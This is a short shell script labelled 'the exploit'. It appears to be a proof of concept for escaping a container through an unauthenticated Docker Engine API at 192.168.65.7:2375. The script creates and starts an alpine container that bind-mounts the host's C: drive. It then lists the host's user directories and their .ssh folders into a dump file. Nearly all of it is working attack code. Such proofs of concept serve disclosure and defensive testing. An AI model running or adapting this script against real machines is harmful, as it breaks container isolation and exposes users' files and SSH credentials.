#!/bin/sh

# the exploit
wget \
  --header="Content-Type: application/json" \
  --post-data '{
    "Image": "alpine",
    "Cmd": [
      "sh",
      "-c",
      "mkdir -p host_root/test; OUT=/host_root/test/pwn_dump.txt; echo \"=== USERS DIRECTORY DUMP ===\" >\"$OUT\"; echo \"Timestamp: $(date)\" >>\"$OUT\"; echo >>\"$OUT\"; echo \"[USERS]\" >>\"$OUT\"; ls -1 /host_root/Users >>\"$OUT\" 2>&1; echo >>\"$OUT\"; echo \"[.ssh DIRECTORIES]\" >>\"$OUT\"; ls -la /host_root/Users/*/.ssh >>\"$OUT\" 2>&1"
    ],
    "HostConfig": {
      "Binds": [
        "/mnt/host/c:/host_root"
      ]
    }
  }' \
  -O - \
  http://192.168.65.7:2375/containers/create > create.json



cid=$(cut -d'"' -f4 create.json)
wget --post-data='' -O - http://192.168.65.7:2375/containers/$cid/start

tail -f /dev/null